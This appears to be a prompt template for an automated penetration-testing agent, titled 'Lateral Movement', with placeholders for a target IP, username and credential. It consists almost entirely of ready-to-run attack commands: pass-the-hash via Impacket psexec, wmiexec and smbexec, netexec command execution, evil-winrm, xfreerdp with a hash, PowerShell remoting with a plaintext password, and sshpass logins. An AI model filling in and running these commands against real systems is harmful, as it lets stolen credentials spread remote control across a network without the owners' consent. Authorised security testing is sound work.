name: Lateral Movement
content:
Perform lateral movement to {target_ip} with {username}.

**Pass-the-Hash (Windows) :**
```bash
# Impacket
impacket-psexec -hashes :{credential} {username}@{target_ip}
impacket-wmiexec -hashes :{credential} {username}@{target_ip}
impacket-smbexec -hashes :{credential} {username}@{target_ip}

# netexec
netexec smb {target_ip} -u {username} -H {credential} -x "whoami"
```

**WinRM :**
```bash
evil-winrm -i {target_ip} -u {username} -H {credential}
```

**PSRemoting :**
```powershell
$cred = New-Object PSCredential('{username}', (ConvertTo-SecureString '{credential}' -AsPlainText -Force))
Enter-PSSession -ComputerName {target_ip} -Credential $cred
```

**RDP :**
```bash
xfreerdp /v:{target_ip} /u:{username} /pth:{credential}
```

**Linux :**
```bash
ssh {username}@{target_ip}
sshpass -p '{credential}' ssh {username}@{target_ip}
```
